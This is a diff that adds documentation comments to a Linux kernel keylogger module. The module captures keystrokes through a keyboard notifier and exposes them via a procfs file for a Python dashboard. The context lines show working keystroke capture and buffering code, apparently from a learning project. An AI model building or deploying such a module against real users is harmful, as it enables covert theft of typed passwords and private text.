@@ -1,3 +1,11 @@
+/**
+ * @file keylogger.c
+ * @brief Kernel space keylogger module
+ *
+ * Captures keyboard events and exposes them to userspace via a procfs entry
+ * 
+ */
+
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/proc_fs.h>
@@ -13,6 +21,17 @@ static struct proc_dir_entry *proc_file;
 static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
 static int key_index = 0; // Tracks how many keys were stored so far
 
+/**
+ * @brief Reads captured keys from the proc file (kernelspace) to user space.
+ * 
+ * Copies the current key buffer to the user space buffer and resets the internal buffer so only new keys are sent next time.
+ * 
+ * @param file  Pointer to the open proc file
+ * @param buf   Userspace buffer where we copy the keys to
+ * @param count How many bytes user wants to read
+ * @param ppos  Pointer to the current position in the file
+ * @return The number of bytes read, 0 if empty, or -EFAULT if copying fails
+ */
 static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
 {
     int len = key_index; // Only the bytes that were filled
@@ -45,6 +64,13 @@ static const struct proc_ops keylogger_proc_ops =
     .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
 };
 
+/**
+ * @brief Appends one char to the key buffer
+ * 
+ * Checks if there is space left in the buffer before adding the character and incrementing the index
+ * 
+ * @param c The character to append
+ */
 static void append_char(char c)
 {
     if (key_index < LOG_BUF_SIZE - 1)
@@ -54,6 +80,14 @@ static void append_char(char c)
     }
 }
 
+/**
+ * @brief Appends a string token to the key buffer
+ * 
+ * Loops through the token and appends each char of it
+ * until the null terminator is reached or the buffer is full
+ * 
+ * @param token Pointer to the string to append
+ */
 static void append_token(const char *token)
 {
     int i;
@@ -70,6 +104,13 @@ static void append_token(const char *token)
     }
 }
 
+/**
+ * @brief Logs printable ASCII characters
+ * 
+ * Filters for standard ASCII characters and escapes brackets to help the Python dashboard parse them later
+ * 
+ * @param v The key value to log
+ */
 static void log_printable(unsigned int v)
 {
     char c = (char)v;
@@ -85,7 +126,14 @@ static void log_printable(unsigned int v)
     }
 }
 
-// Handle special/action keys based on keycodes (pre kernel translation)
+/**
+ * @brief Logs special action keys as string tokens
+ * 
+ * Translates raw pre kernel keycodes into readable tokens
+ * for tracking actions like enter, backspace, and shift
+ * 
+ * @param keycode The raw keycode from the keyboard
+ */
 static void log_special_key(unsigned int keycode)
 {
     switch (keycode)
@@ -124,6 +172,17 @@ static void log_special_key(unsigned int keycode)
     }
 }
 
+/**
+ * @brief Callback function triggered by keyboard events
+ * 
+ * Only key press down events and routes key presses to either 
+ * special key logging or printable character logging based on the event code
+ * 
+ * @param nblock Pointer to the notifier block nb
+ * @param code   The type of keyboard event (keycode, keysym, unicode)
+ * @param _param Pointer to the keyboard notifier parameters
+ * @return NOTIFY_OK to let the kernel continue processing the event normally
+ */
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct
@@ -153,6 +212,14 @@ static struct notifier_block keylogger_nb =
     .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
 };
 
+/**
+ * @brief Initializes the keylogger kernel module
+ * 
+ * Registers the keyboard notifier to start sniffing keystrokes and 
+ * creates a read only proc file for the user space client
+ * 
+ * @return 0 on success.
+ */
 static int __init keylogger_init(void)
 {
     memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer
@@ -164,6 +231,12 @@ static int __init keylogger_init(void)
     return 0;
 }
 
+/**
+ * @brief Cleans up and removes the keylogger module
+ * 
+ * Unregisters the keyboard notifier and removes the 
+ * proc file entry to unload from the kernel
+ */
 static void __exit keylogger_exit(void)
 {
     if (proc_file)
